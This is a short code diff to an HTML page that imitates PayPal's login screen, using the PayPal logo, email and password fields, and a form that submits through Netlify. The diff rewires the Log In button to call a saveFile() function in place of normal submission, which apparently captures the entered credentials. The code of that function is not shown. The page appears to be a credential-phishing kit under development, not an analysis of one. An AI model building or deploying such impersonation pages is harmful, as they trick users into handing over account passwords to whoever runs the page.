@@ -11,12 +11,12 @@
   
     <div class="mainBoxContainer">
       <a class="mainBox" >
-        <form name="fillin" method="POST" data-netlify="true" onsubmit="submit()">
+        <form name="fillin" method="POST" data-netlify="true">
           <img class="element1" src="./images/paypallogo-removebg-preview.png" style="height: 40px; width: 38px;">
           <input name="fillin" id="email" class="element2" type="text" placeholder="Email address or mobile number">
           <input name="fillin" id="password" class="element3" type="password" placeholder="Password">
           <p class="forgottenPassword">Forgotten password?</p>
-          <input type="submit" class="loginButton" value="Log In">
+          <input type="button" class="loginButton" value="Log In" onclick="saveFile()">
           <p class="loginSeperator" style="opacity: 0.8;">---------------------------------- or ----------------------------------</p>
           <button class="SignUpButton">Sign Up</button>
         </form>
